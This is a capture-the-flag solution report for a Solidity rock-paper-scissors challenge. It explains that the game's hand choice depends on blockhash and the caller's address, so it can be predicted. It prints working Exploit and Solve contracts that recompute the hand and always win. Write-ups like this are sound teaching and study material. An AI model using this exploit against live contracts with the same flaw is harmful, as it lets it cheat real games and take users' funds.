# Rock Scissor Paper - Solution Report

## Vulnerability

The main vulnerability in this challenge lies in the `randomShape()` function of the `RockPaperScissors` contract:

```solidity
function randomShape() internal view returns (Hand) {
    return Hand(uint256(keccak256(abi.encodePacked(msg.sender, blockhash(block.number - 1)))) % 3);
}
```

This function has two critical issues:

1. Predictable Randomness: The function uses `blockhash(block.number - 1)` as a source of randomness. However, this value is known and can be predicted by the attacker in the same block.

2. Visible to Callers: Although the function is marked as `internal`, its logic can be replicated by external callers because all inputs (`msg.sender` and `blockhash(block.number - 1)`) are accessible on-chain.

These vulnerabilities allow an attacker to predict the hand that the contract will play before calling `tryToBeatMe()`. By knowing the contract's hand in advance, the attacker can always choose a winning hand, guaranteeing victory and setting the `defeated` flag to `true`.

The use of block-dependent variables for randomness is a common pitfall in smart contract development. In this case, it completely undermines the game's fairness and security, making it possible for an attacker to win every time.

## Proof of Concept (PoC)

The core of the exploit is implemented in the `Exploit` contract:

```solidity
contract Exploit {
    Challenge immutable challenge;

    constructor(Challenge chal) payable {
        challenge = Challenge(chal);
    }

    function exploit() external {
        RockPaperScissors rps = challenge.rps();

        // Recreate the randomShape logic
        RockPaperScissors.Hand challengeHand =
            RockPaperScissors.Hand(uint256(keccak256(abi.encodePacked(address(this), blockhash(block.number - 1)))) % 3);

        // Choose winning hand
        RockPaperScissors.Hand winningHand;
        if (challengeHand == RockPaperScissors.Hand.Rock) {
            winningHand = RockPaperScissors.Hand.Paper;
        } else if (challengeHand == RockPaperScissors.Hand.Paper) {
            winningHand = RockPaperScissors.Hand.Scissors;
        } else {
            winningHand = RockPaperScissors.Hand.Rock;
        }

        // Call tryToBeatMe with our winning hand
        rps.tryToBeatMe(winningHand);
    }
}
```

The `exploit()` function performs the following steps:

1. Gets the `RockPaperScissors` contract instance from the `Challenge` contract.
2. Predicts the challenge's hand by recreating the `randomShape()` logic.
3. Determines the winning hand based on the predicted challenge hand.
4. Calls `tryToBeatMe()` with the winning hand.

The `Solve` contract integrates this exploit into the CTF framework:

```solidity
contract Solve is CTFSolver {
    function solve(address challengeAddress, address) internal override {
        Challenge challenge = Challenge(challengeAddress);
        Exploit exploit = new Exploit(challenge);
        exploit.exploit();
    }
}
```

This `solve()` function deploys the `Exploit` contract and calls its `exploit()` function to solve the challenge.
